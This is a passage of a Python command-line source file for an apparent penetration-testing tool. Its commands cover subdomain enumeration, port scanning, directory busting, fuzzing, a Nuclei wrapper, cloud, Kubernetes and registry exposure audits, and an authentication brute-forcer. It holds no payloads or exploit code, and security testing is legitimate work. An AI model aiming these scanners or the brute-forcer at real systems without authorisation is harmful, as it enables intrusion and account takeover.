                    wordlist_items = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                console.print(f"[green]✓[/green] Loaded custom wordlist: {len(wordlist_items)} entries")
            except Exception as e:
                console.print(f"[red]Error loading wordlist: {e}[/red]")
                raise typer.Exit(code=1)
        else:
            console.print(f"[cyan]Using default wordlist (100 common subdomains)[/cyan]")
        
        console.print(f"[cyan]Concurrency:[/cyan] {concurrency} | [cyan]Timeout:[/cyan] {timeout}s")
        console.print(f"[cyan]CT Logs:[/cyan] {'Enabled' if ct_logs else 'Disabled'} | [cyan]HTTP Check:[/cyan] {'Enabled' if check_http else 'Disabled'}")
        console.print()
        
        # Run enumeration
        try:
            result = await enumerate_subdomains(
                domain=domain,
                wordlist=wordlist_items,
                use_ct_logs=ct_logs,
                check_http=check_http,
                concurrency=concurrency,
                timeout=timeout
            )
            
            # Display results
            stats = result["statistics"]
            subdomains = result["subdomains"]
            
            console.print(f"[green]✓ Enumeration Complete[/green]\n")
            console.print(f"[cyan]Statistics:[/cyan]")
            console.print(f"  Total Found: [green]{stats['total_found']}[/green] subdomain(s)")
            console.print(f"  From DNS Bruteforce: {stats['from_bruteforce']}")
            console.print(f"  From CT Logs: {stats['from_ct_logs']}")
            console.print(f"  Wordlist Size: {stats['wordlist_size']}")
            console.print()
            
            if subdomains:
                # Create results table
                table = Table(title=f"Discovered Subdomains ({len(subdomains)})", box=box.MINIMAL_DOUBLE_HEAD)
                table.add_column("Subdomain", style="cyan", no_wrap=False)
                table.add_column("IP Address(es)", style="green")
                table.add_column("CNAME", style="yellow")
                table.add_column("HTTP", style="magenta")
                
                for sub in subdomains:
                    subdomain_name = sub.get("subdomain", "")
                    ips = ", ".join(sub.get("ips", []))
                    cname = sub.get("cname", "-")
                    
                    # HTTP status
                    http_status = "-"
                    if "http" in sub:
                        http_info = sub["http"]
                        if http_info.get("https", {}).get("accessible"):
                            status_code = http_info["https"].get("status_code", "")
                            http_status = f"✓ HTTPS ({status_code})"
                        elif http_info.get("http", {}).get("accessible"):
                            status_code = http_info["http"].get("status_code", "")
                            http_status = f"✓ HTTP ({status_code})"
                    
                    table.add_row(subdomain_name, ips, cname, http_status)
                
                console.print(table)
                console.print()
                
                # Show subdomain list for easy copy-paste
                console.print("[cyan]Subdomain List:[/cyan]")
                for sub in subdomains:
                    console.print(f"  • {sub.get('subdomain')}")
            else:
                console.print("[yellow]No subdomains found[/yellow]")
            
            # Save output
            if output:
                with open(output, "w", encoding="utf-8") as f:
                    json.dump(result, f, indent=2, ensure_ascii=False)
                console.print(f"\n[green]✓ Saved results to: {output}[/green]")
        
        except Exception as e:
            console.print(f"[red]Error during enumeration: {e}[/red]")
            import traceback
            traceback.print_exc()
            raise typer.Exit(code=1)
    
    asyncio.run(run())

@app.command()
def api_test(host: str, output: Optional[str] = None, bursts: int = 20):
    """Basic API probe: Swagger discovery and simple rate-limit pulses."""
    report = asyncio.run(api_probe(host))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")

@app.command()
def recon_cmd(
    host: Optional[str] = typer.Argument(None, help="Target host (positional)"),
    target: Optional[str] = typer.Option(None, "--target", "-t", help="Alias for host (supports -t)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output file path"),
):
    """Reconnaissance: DNS records, HTTP headers, server/CDN/WAF hints, WHOIS."""
    tgt = target or host
    if not tgt:
        console.print("Provide a host (positional) or --target/-t", style="red")
        raise typer.Exit(code=2)
    report = asyncio.run(recon(tgt))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"[green]Results saved to:[/green] {output}")

@app.command("recon")
def recon_alias(
    host: Optional[str] = typer.Argument(None, help="Target host (positional)"),
    target: Optional[str] = typer.Option(None, "--target", "-t", help="Alias for host (supports -t)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output file path"),
):
    """Alias for recon (compat with legacy Node CLI)."""
    recon_cmd(host=host, target=target, output=output)

@app.command()
def dirbust(host: str, wordlist: Optional[str] = None, concurrency: int = 50, https: bool = True, output: Optional[str] = None):
    """Directory and file discovery with a built-in curated wordlist."""
    report = asyncio.run(dirbust_scan(host, wordlist_path=wordlist, concurrency=concurrency, https=https))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")

@app.command()
def tech(host: str, output: Optional[str] = None):
    """Detect technologies via headers and HTML fingerprints."""
    report = asyncio.run(detect_tech(host))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")

@app.command()
def crawl(host: str, start: Optional[str] = typer.Option(None, "--start", help="Start URL, defaults to https://<host>"), max_pages: int = 30, concurrency: int = 8, output: Optional[str] = None):
    """Lightweight web crawler: same-host pages, secrets scan, CSP/CORS checks."""
    report = asyncio.run(web_crawl(host, start=start, max_pages=max_pages, concurrency=concurrency))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")

@app.command()
def cloud(
    name: str = typer.Argument(..., help="Bucket/account name to check across providers"),
    providers: Optional[str] = typer.Option("aws,azure,gcp", "--providers", help="Comma-separated providers (aws,azure,gcp)"),
    output: Optional[str] = None,
):
    """Audit common cloud storage endpoints for public listing exposure."""
    pv = [p.strip() for p in (providers or "").split(",") if p.strip()]
    report = asyncio.run(cloud_audit(name, pv))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")
@app.command()
def k8s(
    api_base: str = typer.Argument(..., help="Kubernetes API base URL, e.g., https://host:6443"),
    insecure: bool = typer.Option(False, "--insecure", help="Allow insecure TLS (skip certificate verification)"),
    output: Optional[str] = None,
):
    """Audit common unauthenticated Kubernetes API/kubelet endpoints (safe probes)."""
    report = asyncio.run(k8s_audit(api_base, verify_cert=(not insecure)))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")
@app.command()
def container(
    registry: str = typer.Argument(..., help="Container registry host (e.g., registry.example.com)"),
    output: Optional[str] = None,
):
    """Audit container registries for anonymous catalog/API exposure (Docker/Harbor)."""
    report = asyncio.run(container_audit(registry))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")

@app.command()
def report(
    suite: Optional[str] = typer.Option(None, "--suite", help="Path to combined suite JSON"),
    output: str = typer.Option("report.html", "--output", help="Output HTML file path"),
    summary: bool = typer.Option(False, "--summary", help="Generate concise findings-only report"),
):
    """Generate an HTML report from a suite JSON file."""
    if not suite:
        console.print("--suite is required", style="red")
        raise typer.Exit(code=2)
    try:
        with open(suite, "r", encoding="utf-8") as f:
            data = json.load(f)
        html = generate_summary_html_report(data) if summary else generate_html_report(data)
        with open(output, "w", encoding="utf-8") as f:
            f.write(html)
        console.print(f"Saved: {output}")
    except Exception as e:
        console.print(f"Failed to generate report: {e}", style="red")
        raise typer.Exit(code=1)

@app.command()
def suite(
    host: Optional[str] = typer.Argument(None, help="Target host (positional)"),
    target: Optional[str] = typer.Option(None, "--target", "-t", help="Alias for host (supports -t)"),
    ports: str = "1-1024",
    concurrency: int = 200,
    timeout: float = 1.0,
    bursts: int = 20,
    profile: str = typer.Option("full", "--profile", help="Scan profile: web|api|infra|full"),
    output_dir: str = typer.Option("results", "--output-dir", help="Directory to store JSON outputs"),
    cloud_name: Optional[str] = typer.Option(None, "--cloud-name", help="Cloud bucket/account name to audit (aws/azure/gcp)"),
    k8s_api: Optional[str] = typer.Option(None, "--k8s-api", help="K8s API base URL to audit"),
    registry: Optional[str] = typer.Option(None, "--registry", help="Container registry host to audit"),
    mode: str = typer.Option("passive", "--mode", help="Testing mode: passive|active", case_sensitive=False),
    safe_mode: bool = typer.Option(True, "--safe-mode", help="Enable strict caps on active tests"),
    max_requests: int = typer.Option(200, "--max-requests", help="Global cap on active requests"),
    rate_limit: int = typer.Option(10, "--rate-limit", help="Approx requests per second cap for active tests"),
    udp: bool = typer.Option(False, "--udp", help="Include UDP scan of top ports"),
    udp_ports: Optional[str] = typer.Option(None, "--udp-ports", help="UDP ports range/list; defaults to top ports"),
):
    """Run a combined suite: scan, ssl, takeover, api, recon, with unified outputs."""

    async def run_all():
        tgt = target or host
        if not tgt:
            console.print("Provide a host (positional) or --target/-t", style="red")
            raise typer.Exit(code=2)
        # Prepare ports
        targets: List[int] = []
        if "," in ports:
            targets = [int(p.strip()) for p in ports.split(",")]
        elif "-" in ports:
            start, end = ports.split("-")
            targets = list(range(int(start), int(end) + 1))
        else:
            targets = [int(ports)]

        os.makedirs(output_dir, exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        tasks = []
        include_scan = profile in ("infra", "full", "web")
        include_ssl = profile in ("web", "full")
        include_takeover = profile in ("web", "full")
        include_api = profile in ("api", "full", "web")
        include_recon = profile in ("infra", "web", "api", "full")
        include_dirbust = profile in ("web", "full")
        include_tech = profile in ("web", "infra", "full")
        include_crawl = profile in ("web", "full")
        include_web_owasp = profile in ("web", "full")
        include_cloud = bool(cloud_name)
        include_k8s = bool(k8s_api)
        include_container = bool(registry)

        # Launch tasks
        scan_task = None
        if include_scan:
            scan_task = asyncio.create_task(async_port_scan(tgt, targets, concurrency=concurrency, timeout=timeout))
        udp_targets: List[int] = []
        udp_task = None
        if include_scan and udp:
            if udp_ports:
                if "," in udp_ports:
                    udp_targets = [int(p.strip()) for p in udp_ports.split(",")]
                elif "-" in udp_ports:
                    us, ue = udp_ports.split("-")
                    udp_targets = list(range(int(us), int(ue) + 1))
                else:
                    udp_targets = [int(udp_ports)]
            else:
                udp_targets = [53, 123, 161, 500, 137, 138, 67, 68, 69, 1900]
            udp_task = asyncio.create_task(async_udp_scan(tgt, udp_targets, concurrency=concurrency, timeout=timeout))
        ssl_task = asyncio.create_task(analyze_ssl(tgt)) if include_ssl else None
        takeover_task = asyncio.create_task(takeover_scan(tgt)) if include_takeover else None
        api_task = asyncio.create_task(api_probe(tgt)) if include_api else None
        recon_task = asyncio.create_task(recon(tgt)) if include_recon else None
        dirb_task = asyncio.create_task(dirbust_scan(tgt)) if include_dirbust else None
        tech_task = asyncio.create_task(detect_tech(tgt)) if include_tech else None
        # Normalize mode before task creation to avoid unbound reference
        mode_norm = (mode or "passive").lower()
        crawl_task = asyncio.create_task(web_crawl(tgt, max_pages=30, concurrency=8)) if include_crawl else None
        web_owasp_task = asyncio.create_task(web_owasp_passive(tgt)) if include_web_owasp and mode_norm == "passive" else None
        cloud_task = asyncio.create_task(cloud_audit(cast(str, cloud_name))) if include_cloud else None
        k8s_task = asyncio.create_task(k8s_audit(cast(str, k8s_api))) if include_k8s else None
        container_task = asyncio.create_task(container_audit(cast(str, registry))) if include_container else None

        # Gather
        if mode_norm not in ("passive", "active"):
            console.print("--mode must be 'passive' or 'active'", style="red")
            raise typer.Exit(code=2)

        results: dict = {
            "target": tgt,
            "timestamp": ts,
            "profile": profile,
            "mode": mode_norm,
            "controls": {
                "safe_mode": safe_mode,
                "max_requests": max_requests,
                "rate_limit": rate_limit,
            },
        }
        if scan_task:
            scan_results = await scan_task
            results["scan"] = {"ports": targets, "results": scan_results}
            if udp_task:
                udp_results = await udp_task
                results["scan"].update({"udp_ports": udp_targets, "udp_results": udp_results})
            with open(os.path.join(output_dir, f"scan_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                payload = {"target": host, "ports": targets, "results": scan_results}
                if udp_task:
                    payload.update({"udp_ports": udp_targets, "udp_results": results["scan"].get("udp_results", [])})
                json.dump(payload, f, indent=2)
        if ssl_task:
            ssl_report = await ssl_task
            results["ssl"] = ssl_report
            with open(os.path.join(output_dir, f"ssl_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(ssl_report, f, indent=2)
        if takeover_task:
            takeover_report = await takeover_task
            results["takeover"] = takeover_report
            with open(os.path.join(output_dir, f"takeover_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(takeover_report, f, indent=2)
        if api_task:
            api_report = await api_task
            results["api"] = api_report
            with open(os.path.join(output_dir, f"api_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(api_report, f, indent=2)
        if recon_task:
            recon_report = await recon_task
            results["recon"] = recon_report
            with open(os.path.join(output_dir, f"recon_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(recon_report, f, indent=2)
        if dirb_task:
            dirb_report = await dirb_task
            results["dirbust"] = dirb_report
            with open(os.path.join(output_dir, f"dirbust_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(dirb_report, f, indent=2)
        if tech_task:
            tech_report = await tech_task
            results["tech"] = tech_report
            with open(os.path.join(output_dir, f"tech_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(tech_report, f, indent=2)
        if crawl_task:
            crawl_report = await crawl_task
            results["crawl"] = crawl_report
            with open(os.path.join(output_dir, f"crawl_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(crawl_report, f, indent=2)
        if web_owasp_task:
            web_owasp_report = await web_owasp_task
            results["web_owasp"] = web_owasp_report
            with open(os.path.join(output_dir, f"web_owasp_{tgt}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(web_owasp_report, f, indent=2)
        if cloud_task:
            cloud_report = await cloud_task
            results["cloud"] = cloud_report
            with open(os.path.join(output_dir, f"cloud_{(cloud_name or host)}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(cloud_report, f, indent=2)
        if k8s_task:
            k8s_report = await k8s_task
            results["k8s"] = k8s_report
            with open(os.path.join(output_dir, f"k8s_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(k8s_report, f, indent=2)
        if container_task:
            container_report = await container_task
            results["container"] = container_report
            with open(os.path.join(output_dir, f"container_{(registry or host)}_{ts}.json"), "w", encoding="utf-8") as f:
                json.dump(container_report, f, indent=2)

        # Derive a compact summary
        summary = {
            "open_ports": [r["port"] for r in results.get("scan", {}).get("results", []) if r.get("state") == "open"],
            "open_udp_ports": [r["port"] for r in results.get("scan", {}).get("udp_results", []) if r.get("state") == "open"],
            "ssl_severity": results.get("ssl", {}).get("severity"),
            "takeover_vulnerable": results.get("takeover", {}).get("vulnerable"),
            "api_findings": len(results.get("api", {}).get("findings", [])) if results.get("api") else None,
            "recon_waf_hint": any(f.get("type") == "waf_or_cdn_hint" for f in results.get("recon", {}).get("findings", [])) if results.get("recon") else None,
            "cloud_findings": len(results.get("cloud", {}).get("findings", [])) if results.get("cloud") else None,
            "k8s_findings": len(results.get("k8s", {}).get("findings", [])) if results.get("k8s") else None,
            "container_findings": len(results.get("container", {}).get("findings", [])) if results.get("container") else None,
        }
        results["summary"] = summary

        # Save combined
        combined_path = os.path.join(output_dir, f"suite_{tgt}_{ts}.json")
        with open(combined_path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        console.print(f"Saved suite results: {combined_path}")

        # Print concise human summary
        console.print(Panel.fit(
            f"Target: {tgt}\nProfile: {profile} | Mode: {mode_norm}\nOpen ports: {summary['open_ports']}\nOpen UDP ports: {summary.get('open_udp_ports')}\nSSL severity: {summary['ssl_severity']}\nTakeover vulnerable: {summary['takeover_vulnerable']}\nWAF/CDN hint: {summary['recon_waf_hint']}\nCloud findings: {summary['cloud_findings']} | K8s findings: {summary['k8s_findings']} | Container findings: {summary['container_findings']}",
            title="Suite Summary",
            border_style="green",
        ))

    asyncio.run(run_all())

@app.command("threat-intel")
def threat_intel_deprecated():
    """Deprecated: use external threat intel tools; not provided in Python CLI."""
    console.print("`threat-intel` is deprecated in the Python CLI. Use the web/API suite, recon, and external TI sources (e.g., VirusTotal, AbuseIPDB) as needed.", style="yellow")

@app.command("enterprise-scan")
def enterprise_scan_migrate():
    """Deprecated: use `suite` with cloud/k8s/container for enterprise coverage."""
    tip = (
        "enterprise-scan (Node) has been replaced. Use:\n"
        "  scorpion suite <target> --profile full --output-dir results [--cloud-name <name>] [--k8s-api <url>] [--registry <host>]\n"
        "Run per-target and aggregate reports as needed."
    )
    console.print(tip, style="yellow")


@app.command()
def fuzz(
    target: str = typer.Argument(..., help="Target URL"),
    wordlist: str = typer.Option(..., "--wordlist", "-w", help="Path to wordlist file"),
    mode: str = typer.Option("path", "--mode", "-m", help="Fuzz mode: path, param, header"),
    param_name: Optional[str] = typer.Option(None, "--param", help="Parameter name (for param mode)"),
    header_name: Optional[str] = typer.Option(None, "--header", help="Header name (for header mode)"),
    method: str = typer.Option("GET", "--method", "-X", help="HTTP method (GET/POST for param mode)"),
    extensions: Optional[str] = typer.Option(None, "--extensions", "-e", help="Extensions for path fuzzing (comma-separated, e.g., php,html,txt)"),
    match_status: Optional[str] = typer.Option(None, "--match-status", "-mc", help="Match status codes (comma-separated)"),
    filter_status: Optional[str] = typer.Option(None, "--filter-status", "-fc", help="Filter status codes (comma-separated)"),
    match_size: Optional[str] = typer.Option(None, "--match-size", "-ms", help="Match content lengths (comma-separated)"),
    filter_size: Optional[str] = typer.Option(None, "--filter-size", "-fs", help="Filter content lengths (comma-separated)"),
    match_words: Optional[str] = typer.Option(None, "--match-words", "-mw", help="Match word counts (comma-separated)"),
    filter_words: Optional[str] = typer.Option(None, "--filter-words", "-fw", help="Filter word counts (comma-separated)"),
    match_lines: Optional[str] = typer.Option(None, "--match-lines", "-ml", help="Match line counts (comma-separated)"),
    filter_lines: Optional[str] = typer.Option(None, "--filter-lines", "-fl", help="Filter line counts (comma-separated)"),
    concurrency: int = typer.Option(10, "--concurrency", "-c", help="Concurrent requests"),
    timeout: float = typer.Option(10.0, "--timeout", "-t", help="Request timeout in seconds"),
    delay: float = typer.Option(0.0, "--delay", "-d", help="Delay between requests in seconds"),
    auto_calibrate: bool = typer.Option(True, "--auto-calibrate", "-ac", help="Auto-calibrate baseline filtering"),
    follow_redirects: bool = typer.Option(False, "--follow-redirects", "-r", help="Follow HTTP redirects"),
    insecure: bool = typer.Option(False, "--insecure", "-k", help="Skip SSL verification"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output JSON file"),
):
    """
    Production-grade web fuzzer with advanced filtering.
    Supports path, parameter, and header fuzzing with auto-calibration.
    """
    async def run():
        from .fuzzer import AdvancedFuzzer, load_wordlist
        
        # Load wordlist
        try:
            wordlist_data = load_wordlist(wordlist)
            console.print(f"Loaded {len(wordlist_data)} payloads from {wordlist}", style="cyan")
        except FileNotFoundError:
            console.print(f"ERROR: Wordlist not found: {wordlist}", style="red")
            raise typer.Exit(code=1)
        except Exception as e:
            console.print(f"ERROR loading wordlist: {e}", style="red")
            raise typer.Exit(code=1)
        
        # Parse match/filter criteria
        match_status_list = [int(x) for x in match_status.split(",")] if match_status else None
        filter_status_list = [int(x) for x in filter_status.split(",")] if filter_status else None
        match_size_list = [int(x) for x in match_size.split(",")] if match_size else None
        filter_size_list = [int(x) for x in filter_size.split(",")] if filter_size else None
        match_words_list = [int(x) for x in match_words.split(",")] if match_words else None
        filter_words_list = [int(x) for x in filter_words.split(",")] if filter_words else None
        match_lines_list = [int(x) for x in match_lines.split(",")] if match_lines else None
        filter_lines_list = [int(x) for x in filter_lines.split(",")] if filter_lines else None
        extensions_list = [e.strip() for e in extensions.split(",")] if extensions else None
        
        # Initialize fuzzer
        fuzzer = AdvancedFuzzer(
            target=target,
            wordlist=wordlist_data,
            concurrency=concurrency,
            timeout=timeout,
            delay=delay,
            auto_calibrate=auto_calibrate,
            follow_redirects=follow_redirects,
            verify_ssl=not insecure,
        )
        
        console.print(f"\n[cyan]Starting {mode.upper()} fuzzing on {target}[/cyan]")
        console.print(f"Concurrency: {concurrency} | Timeout: {timeout}s | Auto-calibrate: {auto_calibrate}\n")
        
        # Execute fuzzing based on mode
        try:
            if mode == "path":
                results = await fuzzer.fuzz_paths(
                    extensions=extensions_list,
                    match_status=match_status_list,
                    filter_status=filter_status_list,
                    match_size=match_size_list,
                    filter_size=filter_size_list,
                    match_words=match_words_list,
                    filter_words=filter_words_list,
                    match_lines=match_lines_list,
                    filter_lines=filter_lines_list,
                )
            elif mode == "param":
                if not param_name:
                    console.print("ERROR: --param required for param mode", style="red")
                    raise typer.Exit(code=1)
                results = await fuzzer.fuzz_parameters(
                    param_name=param_name,
                    method=method,
                    match_status=match_status_list,
                    filter_status=filter_status_list,
                    match_size=match_size_list,
                    filter_size=filter_size_list,
                    match_words=match_words_list,
                    filter_words=filter_words_list,
                    match_lines=match_lines_list,
                    filter_lines=filter_lines_list,
                )
            elif mode == "header":
                if not header_name:
                    console.print("ERROR: --header required for header mode", style="red")
                    raise typer.Exit(code=1)
                results = await fuzzer.fuzz_headers(
                    header_name=header_name,
                    match_status=match_status_list,
                    filter_status=filter_status_list,
                    match_size=match_size_list,
                    filter_size=filter_size_list,
                    match_words=match_words_list,
                    filter_words=filter_words_list,
                    match_lines=match_lines_list,
                    filter_lines=filter_lines_list,
                )
            else:
                console.print(f"ERROR: Invalid mode: {mode}. Use: path, param, header", style="red")
                raise typer.Exit(code=1)
        except Exception as e:
            console.print(f"ERROR during fuzzing: {e}", style="red")
            raise typer.Exit(code=1)
        
        # Display results
        if results:
            table = Table(title=f"Fuzz Results ({len(results)} findings)", box=box.ROUNDED)
            table.add_column("Status", style="cyan")
            table.add_column("Size", style="yellow")
            table.add_column("Words", style="yellow")
            table.add_column("Lines", style="yellow")
            table.add_column("Time", style="magenta")
            table.add_column("Payload", style="green")
            
            for result in results[:50]:  # Show first 50
                table.add_row(
                    str(result.status_code),
                    str(result.content_length),
                    str(result.word_count),
                    str(result.line_count),
                    f"{result.response_time:.2f}s",
                    result.payload[:40],
                )
            
            console.print(table)
            console.print(f"\n[green]Found {len(results)} results[/green]")
        else:
            console.print("[yellow]No results found (all filtered)[/yellow]")
        
        # Save output
        if output:
            import json
            from dataclasses import asdict
            output_data = {
                "target": target,
                "mode": mode,
                "total_payloads": len(wordlist_data),
                "total_results": len(results),
                "results": [asdict(r) for r in results],
            }
            with open(output, "w", encoding="utf-8") as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)
            console.print(f"Results saved to: {output}", style="cyan")
    
    asyncio.run(run())


@app.command()
def nuclei(
    target: Optional[str] = typer.Argument(None, help="Target URL or file with URLs"),
    target_opt: Optional[str] = typer.Option(None, "--target", "-t", help="Target URL (alternative to positional)"),
    templates: Optional[str] = typer.Option(None, "--templates", "-T", help="Template paths (comma-separated)"),
    tags: Optional[str] = typer.Option(None, "--tags", help="Template tags (comma-separated, e.g., cve,xss,sqli)"),
    severity: Optional[str] = typer.Option(None, "--severity", "-s", help="Severity filter (comma-separated: critical,high,medium,low,info)"),
    exclude_severity: Optional[str] = typer.Option(None, "--exclude-severity", "-es", help="Exclude severity levels"),
    include_tags: Optional[str] = typer.Option(None, "--include-tags", "-it", help="Additional tags to include"),
    exclude_tags: Optional[str] = typer.Option(None, "--exclude-tags", "-et", help="Tags to exclude"),
    rate_limit: int = typer.Option(150, "--rate-limit", "-rl", help="Requests per second"),
    concurrency: int = typer.Option(25, "--concurrency", "-c", help="Template concurrency"),
    timeout: int = typer.Option(10, "--timeout", help="Request timeout in seconds"),
    retries: int = typer.Option(1, "--retries", help="Retries on failure"),
    update: bool = typer.Option(False, "--update", "-u", help="Update nuclei templates before scan"),
    list_templates: bool = typer.Option(False, "--list", "-l", help="List available templates and exit"),
    silent: bool = typer.Option(False, "--silent", help="Suppress progress output"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output JSONL file"),
):
    """
    Production Nuclei integration for vulnerability scanning.
    Requires nuclei binary installed in PATH.
    """
    from .nuclei_wrapper import NucleiScanner, get_nuclei_version
    
    # Check nuclei installation
    version = get_nuclei_version()
    if not version:
        console.print("ERROR: Nuclei not found in PATH", style="red")
        console.print("\nInstall nuclei:", style="yellow")
        console.print("  Linux/Debian: sudo apt install nuclei", style="cyan")
        console.print("  macOS: brew install nuclei", style="cyan")
        console.print("  Windows: Download from https://github.com/projectdiscovery/nuclei/releases", style="cyan")
        raise typer.Exit(code=1)
    
    console.print(f"Nuclei version: {version}", style="cyan")
    
    # Use -t option if provided, otherwise positional argument
    final_target = target_opt or target
    if not final_target:
        console.print("ERROR: Target required (provide as argument or use -t/--target)", style="red")
        raise typer.Exit(code=1)
    
    try:
        scanner = NucleiScanner()
    except FileNotFoundError as e:
        console.print(f"ERROR: {e}", style="red")
        raise typer.Exit(code=1)
    
    # Update templates
    if update:
        console.print("Updating nuclei templates...", style="cyan")
        if scanner.check_updates():
            console.print("Templates updated successfully", style="green")
        else:
            console.print("Failed to update templates", style="yellow")
    
    # List templates
    if list_templates:
        console.print("Listing templates...", style="cyan")
        tags_list = tags.split(",") if tags else None
        templates_list = scanner.list_templates(tags=tags_list)
        
        if templates_list:
            console.print(f"\nFound {len(templates_list)} templates:\n", style="green")
            for template in templates_list[:100]:  # Show first 100
                console.print(f"  - {template}")
            if len(templates_list) > 100:
                console.print(f"\n... and {len(templates_list) - 100} more")
        else:
            console.print("No templates found", style="yellow")
        
        raise typer.Exit()
    
    # Run scan
    console.print(f"\n[cyan]Starting Nuclei scan on {final_target}[/cyan]")
    console.print(f"Rate limit: {rate_limit}/s | Concurrency: {concurrency} | Timeout: {timeout}s\n")
    
    try:
        templates_list = templates.split(",") if templates else None
        tags_list = tags.split(",") if tags else None
        severity_list = severity.split(",") if severity else None
        exclude_severity_list = exclude_severity.split(",") if exclude_severity else None
        include_tags_list = include_tags.split(",") if include_tags else None
        exclude_tags_list = exclude_tags.split(",") if exclude_tags else None
        
        results = scanner.scan(
            target=final_target,
            templates=templates_list,
            tags=tags_list,
            severity=severity_list,
            rate_limit=rate_limit,
            concurrency=concurrency,
            timeout=timeout,
            retries=retries,
            output_file=output,
            include_tags=include_tags_list,
            exclude_tags=exclude_tags_list,
            exclude_severity=exclude_severity_list,
            silent=silent,
        )
        
        # Display summary
        if results:
            severity_counts = {}
            for result in results:
                sev = result.get("info", {}).get("severity", "unknown")
                severity_counts[sev] = severity_counts.get(sev, 0) + 1
            
            console.print(f"\n[green]Scan completed: {len(results)} findings[/green]\n")
            
            table = Table(title="Severity Breakdown", box=box.ROUNDED)
            table.add_column("Severity", style="cyan")
            table.add_column("Count", style="yellow")
            
            for sev in ["critical", "high", "medium", "low", "info", "unknown"]:
                if sev in severity_counts:
                    table.add_row(sev.upper(), str(severity_counts[sev]))
            
            console.print(table)
            
            if output:
                console.print(f"\nResults saved to: {output}", style="cyan")
        else:
            console.print("[yellow]No vulnerabilities found[/yellow]")
    
    except TimeoutError:
        console.print("ERROR: Nuclei scan timed out", style="red")
        raise typer.Exit(code=1)
    except Exception as e:
        console.print(f"ERROR during nuclei scan: {e}", style="red")
        raise typer.Exit(code=1)


@app.command()
def bruteforce(
    target: str = typer.Argument(..., help="Target URL"),
    auth_type: str = typer.Option(..., "--auth-type", "-a", help="Auth type: basic, form, json"),
    usernames: Optional[str] = typer.Option(None, "--usernames", "-u", help="Username or file with usernames (one per line)"),
    passwords: Optional[str] = typer.Option(None, "--passwords", "-p", help="Password or file with passwords (one per line)"),
    username_file: Optional[str] = typer.Option(None, "--username-file", "-U", help="File with usernames (one per line)"),
    password_file: Optional[str] = typer.Option(None, "--password-file", "-P", help="File with passwords (one per line)"),
    single_user: Optional[str] = typer.Option(None, "--user", help="Single username to test"),
    single_pass: Optional[str] = typer.Option(None, "--pass", help="Single password to test"),
    username_field: str = typer.Option("username", "--user-field", help="Username field name (form/json)"),
    password_field: str = typer.Option("password", "--pass-field", help="Password field name (form/json)"),
    method: str = typer.Option("POST", "--method", "-X", help="HTTP method (for form auth)"),
    success_string: Optional[str] = typer.Option(None, "--success", help="String indicating successful login"),
    failure_string: Optional[str] = typer.Option(None, "--failure", help="String indicating failed login"),
    success_key: Optional[str] = typer.Option(None, "--success-key", help="JSON key indicating success (for json auth)"),
    concurrency: int = typer.Option(5, "--concurrency", "-c", help="Concurrent attempts (be careful with rate-limiting!)"),
    timeout: float = typer.Option(10.0, "--timeout", "-t", help="Request timeout in seconds"),
    delay: float = typer.Option(0.0, "--delay", "-d", help="Delay between attempts in seconds"),
    stop_on_success: bool = typer.Option(True, "--stop-on-success", help="Stop after first successful login"),
    insecure: bool = typer.Option(False, "--insecure", "-k", help="Skip SSL verification"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output JSON file"),
):
    """
    Production authentication brute-forcer.
    Supports HTTP Basic Auth, form-based, and JSON API authentication.
    ⚠️ WARNING: Only use on systems you own or have permission to test!
    """
    async def run():
        from .bruteforce import AuthBruteForcer, load_credentials_file
        
        # Load usernames
        username_list = []
        if single_user:
            username_list = [single_user]
        elif username_file:
            try:
                username_list = load_credentials_file(username_file)
                console.print(f"Loaded {len(username_list)} usernames from {username_file}", style="cyan")
            except FileNotFoundError:
                console.print(f"ERROR: Username file not found: {username_file}", style="red")
                raise typer.Exit(code=1)
        elif usernames:
            import os
            if os.path.exists(usernames):
                username_list = load_credentials_file(usernames)
                console.print(f"Loaded {len(username_list)} usernames from {usernames}", style="cyan")
            else:
                username_list = [u.strip() for u in usernames.split(",")]
        else:
            console.print("ERROR: Provide --user, --usernames, or --username-file", style="red")
            raise typer.Exit(code=1)
        
        # Load passwords
        password_list = []
        if single_pass:
            password_list = [single_pass]
        elif password_file:
            try:
                password_list = load_credentials_file(password_file)
                console.print(f"Loaded {len(password_list)} passwords from {password_file}", style="cyan")
            except FileNotFoundError:
